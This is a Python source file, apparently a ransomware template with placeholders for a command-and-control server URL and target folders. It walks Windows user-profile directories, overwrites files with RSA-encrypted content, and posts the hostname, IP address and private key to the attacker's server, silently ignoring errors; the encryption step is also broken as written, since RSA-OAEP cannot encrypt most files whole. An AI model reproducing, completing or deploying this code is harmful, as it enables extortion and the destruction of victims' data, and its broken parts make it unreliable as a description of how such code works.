import os
import socket
import requests
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes

C2_SERVER = "__C2_SERVER_URL__"
TARGET_DIRECTORIES = __TARGET_DIRECTORIES__

def report_victim(key_data, algo_type):
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        data = {
            'hostname': hostname,
            'ip_address': ip_address,
            'os': 'Windows',
            'encryption_key': key_data,
            'encryption_type': algo_type,
            'status': 'encrypted'
        }
        requests.post(C2_SERVER, json=data, timeout=15)
    except Exception as e:
        pass

def encrypt_files():
    user_profile = os.environ.get('USERPROFILE', 'C:/Users/Default')
    
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    public_key = private_key.public_key()
    
    pem_private = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    ).decode()
    
    for target_name in TARGET_DIRECTORIES:
        if os.path.isabs(target_name):
            target_dir = target_name
        else:
            target_dir = os.path.join(user_profile, target_name)
            
        if os.path.exists(target_dir):
            for root, dirs, files in os.walk(target_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    try:
                        with open(file_path, "rb") as f:
                            data = f.read()
                        
                        encrypted = public_key.encrypt(
                            data,
                            padding.OAEP(
                                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                                algorithm=hashes.SHA256(),
                                label=None
                            )
                        )
                        with open(file_path, "wb") as f:
                            f.write(encrypted)
                    except Exception:
                        pass
            
    report_victim(pem_private, "RSA")

if __name__ == '__main__':
    encrypt_files()